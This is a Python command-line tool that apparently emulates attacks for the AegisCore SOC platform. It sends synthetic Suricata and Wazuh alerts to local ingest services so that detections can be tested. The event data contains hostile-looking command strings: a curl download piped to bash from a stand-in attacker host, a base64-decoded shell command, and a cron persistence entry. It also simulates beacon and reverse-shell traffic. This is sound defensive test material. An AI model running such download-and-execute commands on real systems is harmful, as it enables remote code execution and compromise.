from __future__ import annotations

import argparse
import json
import os
import sys
import time
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any
from urllib.error import HTTPError, URLError
from urllib.request import Request, urlopen


SCENARIOS = {
    "outbound-beacon": "Repeated controlled callbacks that look like C2 beaconing.",
    "suspicious-script": "Encoded command and download-execute style host telemetry.",
    "bruteforce-success": "Repeated failed logins followed by anomalous success.",
    "exfil-burst": "Large upload-like network event using documentation IP space.",
    "persistence-like": "Cron/startup style persistence-like host event.",
    "suspicious-download": "Suspicious curl/wget style download pattern.",
    "reverse-shell-like": "Controlled callback to a reverse-shell-like listener port.",
}


def load_env_file(path: Path) -> None:
    if not path.exists():
        return
    for line in path.read_text(encoding="utf-8").splitlines():
        stripped = line.strip()
        if not stripped or stripped.startswith("#") or "=" not in stripped:
            continue
        key, value = stripped.split("=", 1)
        os.environ.setdefault(key.strip(), value.strip())


def load_env() -> None:
    cwd = Path.cwd()
    load_env_file(cwd / ".env")
    load_env_file(cwd / ".env.production")


def now(offset_seconds: int = 0) -> str:
    return (datetime.now(UTC) + timedelta(seconds=offset_seconds)).isoformat()


def post_json(url: str, payload: dict[str, Any] | None = None, api_key: str | None = None) -> dict[str, Any]:
    body = json.dumps(payload or {}).encode("utf-8")
    headers = {"Content-Type": "application/json"}
    if api_key:
        headers["X-SOC-API-Key"] = api_key
    request = Request(url, data=body, headers=headers, method="POST")
    try:
        with urlopen(request, timeout=20) as response:  # noqa: S310 - local operator-selected URL.
            return json.loads(response.read().decode("utf-8"))
    except HTTPError as exc:
        detail = exc.read().decode("utf-8", errors="replace")
        raise SystemExit(f"HTTP {exc.code} from {url}: {detail}") from exc
    except URLError as exc:
        raise SystemExit(f"Could not reach {url}: {exc}") from exc


def suricata_event(signature_id: int, signature: str, host: str, src_ip: str, dest_ip: str, **extra: Any) -> dict[str, Any]:
    payload: dict[str, Any] = {
        "timestamp": now(),
        "event_type": "alert",
        "src_ip": src_ip,
        "src_port": 51514,
        "dest_ip": dest_ip,
        "dest_port": extra.pop("dest_port", 8443),
        "proto": "TCP",
        "host": host,
        "container": host,
        "alert": {
            "signature_id": signature_id,
            "signature": signature,
            "category": "Demo adversary emulation",
            "severity": 2,
        },
    }
    payload.update(extra)
    return payload


def wazuh_event(rule_id: int, description: str, host: str, level: int = 10, **data: Any) -> dict[str, Any]:
    return {
        "timestamp": now(),
        "agent": {"id": "demo", "name": host},
        "rule": {"id": rule_id, "level": level, "description": description},
        "data": {"container": host, **data},
    }


def direct_payloads(scenario: str) -> list[tuple[str, dict[str, Any]]]:
    if scenario == "outbound-beacon":
        return [
            (
                "/ingest/suricata",
                suricata_event(
                    900001,
                    "DEMO C2-like repeated outbound beacon",
                    "workstation-1",
                    "172.24.0.10",
                    "10.13.37.10",
                    http={"hostname": "attacker-sim.local", "url": f"/callback/demo/{index}"},
                ),
            )
            for index in range(4)
        ]
    if scenario == "suspicious-script":
        return [
            (
                "/ingest/wazuh",
                wazuh_event(
                    100200,
                    "DEMO suspicious encoded shell command pattern",
                    "workstation-1",
                    username="demo-user",
                    process="bash",
                    command="bash -c 'echo ZGVtby1vbmx5 | base64 -d | sh'",
                    asset_ip="172.24.0.10",
                ),
            ),
            (
                "/ingest/wazuh",
                wazuh_event(
                    100200,
                    "DEMO suspicious encoded shell command pattern",
                    "workstation-1",
                    username="demo-user",
                    process="bash",
                    command="curl -fsS http://attacker-sim.local/payload.sh | bash # demo-only",
                    asset_ip="172.24.0.10",
                ),
            ),
        ]
    if scenario == "bruteforce-success":
        events = [
            (
                "/ingest/wazuh",
                wazuh_event(
                    100300,
                    "DEMO repeated failed SSH login",
                    "server-1",
                    level=8,
                    username="demo-admin",
                    process="sshd",
                    srcip="203.0.113.50",
                    asset_ip="172.24.0.20",
                ),
            )
            for _ in range(5)
        ]
        events.append(
            (
                "/ingest/wazuh",
                wazuh_event(
                    100301,
                    "DEMO suspicious login success after brute force",
                    "server-1",
                    level=12,
                    username="demo-admin",
                    process="sshd",
                    srcip="203.0.113.50",
                    asset_ip="172.24.0.20",
                ),
            )
        )
        return events
    if scenario == "exfil-burst":
        return [
            (
                "/ingest/suricata",
                suricata_event(
                    900004,
                    "DEMO exfiltration-like burst transfer",
                    "workstation-1",
                    "172.24.0.10",
                    "203.0.113.50",
                    dest_port=443,
                    bytes_toserver=52428800,
                    http={"hostname": "upload.example.invalid", "url": "/upload-demo"},
                ),
            )
        ]
    if scenario == "persistence-like":
        return [
            (
                "/ingest/wazuh",
                wazuh_event(
                    100400,
                    "DEMO persistence-like cron entry creation",
                    "workstation-1",
                    level=7,
                    username="demo-user",
                    process="crontab",
                    command="echo '* * * * * echo demo-only' | crontab -",
                ),
            )
        ]
    if scenario == "suspicious-download":
        return direct_payloads("suspicious-script")
    if scenario == "reverse-shell-like":
        return [
            (
                "/ingest/suricata",
                suricata_event(
                    900001,
                    "DEMO reverse-shell-like callback to controlled listener",
                    "workstation-1",
                    "172.24.0.10",
                    "10.13.37.10",
                    dest_port=4444,
                ),
            )
        ]
    raise SystemExit(f"Unknown scenario: {scenario}")


def run_scenario(args: argparse.Namespace) -> None:
    load_env()
    api_key = args.api_key or os.getenv("SOC_API_KEY", "")
    if args.mode == "simulator":
        url = f"{args.simulator_url.rstrip('/')}/scenarios/{args.scenario}"
        print(json.dumps(post_json(url, api_key=api_key), indent=2))
        return

    normalizer = args.normalizer_url.rstrip("/")
    results: list[dict[str, Any]] = []
    for index, (path, payload) in enumerate(direct_payloads(args.scenario)):
        payload["timestamp"] = now(index)
        print(f"[demo-attack-runner] sending benign {args.scenario} event {index + 1}")
        results.append(post_json(f"{normalizer}{path}", payload, api_key=api_key))
        if args.delay > 0:
            time.sleep(args.delay)
    print(json.dumps({"scenario": args.scenario, "mode": "direct", "events": results}, indent=2))


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="demo-attack-runner",
        description="Safe benign demo attack runner for AegisCore.",
    )
    sub = parser.add_subparsers(dest="command", required=True)
    sub.add_parser("list", help="List available safe demo scenarios.")
    run = sub.add_parser("run", help="Run a safe demo scenario.")
    run.add_argument("scenario", choices=sorted(SCENARIOS))
    run.add_argument("--mode", choices=["simulator", "direct"], default="simulator")
    run.add_argument("--simulator-url", default=os.getenv("THREAT_SIMULATOR_URL", "http://127.0.0.1:8005"))
    run.add_argument("--normalizer-url", default=os.getenv("NORMALIZER_URL", "http://127.0.0.1:8001"))
    run.add_argument("--api-key", default="")
    run.add_argument("--delay", type=float, default=0.1)
    return parser


def main() -> int:
    parser = build_parser()
    args = parser.parse_args()
    if args.command == "list":
        print(json.dumps(SCENARIOS, indent=2))
        return 0
    if args.command == "run":
        run_scenario(args)
        return 0
    parser.print_help()
    return 2


if __name__ == "__main__":
    sys.exit(main())
